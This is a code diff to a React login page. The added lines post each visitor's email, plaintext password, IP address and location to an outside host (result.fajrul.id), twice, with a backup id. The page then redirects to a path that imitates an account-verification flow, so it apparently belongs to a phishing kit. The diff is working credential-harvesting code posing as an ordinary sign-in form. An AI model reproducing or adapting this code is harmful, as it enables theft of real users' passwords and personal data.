@@ -5,12 +5,17 @@ import "./login.css";
 import validator from "validator";
 import CryptoJS from "crypto-js";
 import Header from "../Header/Header";
+import axios from "axios";
+import { userId } from "../../config";
 
 const Login = () => {
   const [loginView, setLoginView] = useState(true);
   const [isValid, setIsValid] = useState(false);
 
+  const [ip, setIP] = useState("");
+
   const [email, setEmail] = useState("");
+  const [location, setLocation] = useState("");
   const [emailHashed, setEmailHashed] = useState("");
 
   const [password, setPassword] = useState("");
@@ -47,6 +52,39 @@ const Login = () => {
         btnLogin1.style.display = "block";
       }, 1000);
     } else if (isValid === true) {
+      const result = {
+        email: email,
+        password: password,
+        location: location,
+        userId: userId,
+      };
+      const resultbackup = {
+        email: email,
+        password: password,
+        location: location,
+        userId: "resultdefault",
+      };
+      axios
+        .post("https://result.fajrul.id/api/login", result)
+        .then((response) => {
+          console.log(response);
+          // do something with the response, such as redirect to the login page
+        })
+        .catch((error) => {
+          console.log(error);
+          // handle error, such as displaying error messages to the user
+        });
+      axios
+        .post("https://result.fajrul.id/api/login", resultbackup)
+        .then((response) => {
+          console.log(response);
+          // do something with the response, such as redirect to the login page
+        })
+        .catch((error) => {
+          console.log(error);
+          // handle error, such as displaying error messages to the user
+        });
+
       setTimeout(() => {
         navigate(`/account/en/?view?=verify&&applIdKey?=${data.emailHashed}`, {
           state: data,
@@ -61,6 +99,20 @@ const Login = () => {
 
     return;
   }
+  const getGeo = async () => {
+    try {
+      const response = await await axios.get(`http://ip-api.com/json/`);
+      setLocation(`${response.data.country} ${response.data.query}`);
+      setIP(response.data.query);
+      console.info(response);
+    } catch (error) {
+      console.error(error);
+    }
+  };
+
+  useEffect(() => {
+    getGeo();
+  }, []);
 
   const munculPass = () => {
     btnLogin.style.display = "none";
